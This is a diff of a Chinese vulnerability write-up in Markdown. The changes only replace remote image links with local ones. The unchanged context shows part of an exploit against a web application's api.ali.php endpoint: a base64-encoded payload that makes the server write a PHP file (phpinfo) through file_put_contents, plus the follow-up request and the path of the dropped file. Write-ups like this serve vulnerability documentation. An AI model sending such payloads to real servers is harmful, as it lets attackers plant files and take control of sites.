@@ -14,7 +14,7 @@
 
 登陆页面
 
-![image-20220520154337067](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205201543147.png)
+![image-20220520154337067](./images/202205201543147.png)
 
 向 api.ali.php 发送请求包
 
@@ -40,7 +40,7 @@ Content-Type: application/octet-stream
 ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2ZiNjc5MGY0LnBocCcsJzw/cGhwIHBocGluZm8oKTs/PicpOw==file_put_contents('../../fb6790f4.php','');
 ```
 
-![image-20220520154357492](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205201543536.png)
+![image-20220520154357492](./images/202205201543536.png)
 
 再发送GET请求写入文件，页面返回`+OK`
 
@@ -50,4 +50,4 @@ ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2ZiNjc5MGY0LnBocCcsJzw/cGhwIHBocGluZm8oKTs/Picp
 
 其中请求中对 2109 为 年月,路径为 `/fb6790f4.php,`
 
-![image-20220520154429920](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205201544984.png)
+![image-20220520154429920](./images/202205201544984.png)
